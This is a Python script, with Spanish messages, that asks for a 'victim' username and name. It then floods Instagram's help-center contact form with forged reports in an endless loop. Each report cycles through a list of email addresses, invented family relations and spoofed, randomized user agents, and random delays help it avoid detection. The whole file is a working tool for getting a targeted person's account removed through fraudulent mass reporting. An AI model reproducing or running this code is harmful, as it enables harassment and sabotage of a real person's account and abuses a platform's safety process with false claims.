import requests
import random
import os
from datetime import datetime
from time import sleep

CONFIG = {
    "email_file": "emails.txt",
    "url": "https://help.instagram.com/ajax/help/contact/submit/page",
    "headers_base": {
        "Host": "help.instagram.com",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://help.instagram.com",
        "referer": "https://help.instagram.com/contact/723586364339719",
        "accept": "*/*",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    },
    "sleep_range": (1, 3),
    "log_file": "report_log.txt",
}

def generate_user_agents():
    user_agents = []
    bases = [
        "Mozilla/5.0 ({system}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version} Safari/537.36",
        "Mozilla/5.0 ({system}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{version} Mobile/15E148 Safari/604.1",
    ]
    systems = [
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "Linux; Android 8.0.0; Plume L2",
        "iPhone; CPU iPhone OS 16_0 like Mac OS X",
    ]
    browsers = [
        ("Chrome", [99, 100, 110, 116]),
        ("Safari", [12, 13, 14, 15]),
        ("Opera", [50, 60, 70, 80]),
        ("Brave", [1, 1.2, 1.3, 1.5]),
    ]

    for _ in range(100):
        system = random.choice(systems)
        browser, versions = random.choice(browsers)
        version = random.choice(versions)
        base = random.choice(bases)
        user_agents.append(base.format(system=system, browser=browser, version=version))

    return user_agents

USER_AGENTS = generate_user_agents()
def load_emails(file_path):
    try:
        with open(file_path, "r") as f:
            emails = [line.strip() for line in f if line.strip()]
        if not emails:
            raise ValueError(f"El archivo {file_path} está vacío.")
        return emails
    except FileNotFoundError:
        print(f"[×] Error: El archivo {file_path} no se encontró.")
        exit()
    except ValueError as e:
        print(f"[×] Error: {e}")
        exit()

# Generar data del formulario
def generate_form_data(user, name, email, relation, ts):
    return (
        f'jazoest=2931&lsd=AVq5uabXj48&Field258021274378282={user}&Field735407019826414={name}&'
        f'Field506888789421014[year]=2014&Field506888789421014[month]=11&Field506888789421014[day]=11&'
        f'Field294540267362199={relation}&inputEmail={email}&support_form_id=723586364339719&'
        f'support_form_locale_id=en_US&support_form_hidden_fields=%7B%7D&'
        f'support_form_fact_false_fields=[]&__user=0&__a=1&__req=6&__hs=19552.BP%3ADEFAULT.2.0..0.0&dpr=1&'
        f'__ccg=GOOD&__rev=1007841948&__s=s4c6vz%3Anapxo9%3An9ncx2&__hsi=7255652935514227640&'
        f'__dyn=7xe6E5aQ1PyUbFuC1swgE98nwgU6C7UW8xi642-7E2vwXw5ux60Vo1upE4W0OE2WxO2O1Vwooa81VohwnU1e42C220qu1Tw40wdq0Ho2ewnE3fw6iw4vwbS1Lw4Cwcq&'
        f'__csr=&__spin_r=1007841948&__spin_b=trunk&__spin_t={ts}'
    )

def log_result(log_file, message):
    with open(log_file, "a") as f:
        f.write(f"{message}\n")


def main():
    os.system('clear')
    user = input(f'[+] Victim UserName: ')
    name = input(f'[+] Victim Name: ')
    emails = load_emails(CONFIG["email_file"])
    relations = ["Parent", "Non-Family", "Extended family", "Sibling", "Other"]
    count = 0

    while True:
        try:
            timestamp = int(datetime.timestamp(datetime.now()))
            email = random.choice(emails)
            relation = random.choice(relations)
            headers = CONFIG["headers_base"].copy()
            headers["user-agent"] = random.choice(USER_AGENTS)
            data = generate_form_data(user, name, email, relation, timestamp)

            response = requests.post(CONFIG["url"], headers=headers, data=data)
            if response.status_code == 200:
                count += 1
                message = f'[√] Report #{count} enviado con éxito para {user} ({email})'
                print(message)
                log_result(CONFIG["log_file"], message)
            else:
                error_message = f'[×] Error: Código de respuesta {response.status_code}'
                print(error_message)
                log_result(CONFIG["log_file"], error_message)
        except requests.RequestException as e:
            error_message = f'[×] Error de red: {str(e)}'
            print(error_message)
            log_result(CONFIG["log_file"], error_message)
        except Exception as e:
            error_message = f'[×] Error inesperado: {str(e)}'
            print(error_message)
            log_result(CONFIG["log_file"], error_message)

        sleep(random.uniform(*CONFIG["sleep_range"]))

if __name__ == "__main__":
    main()
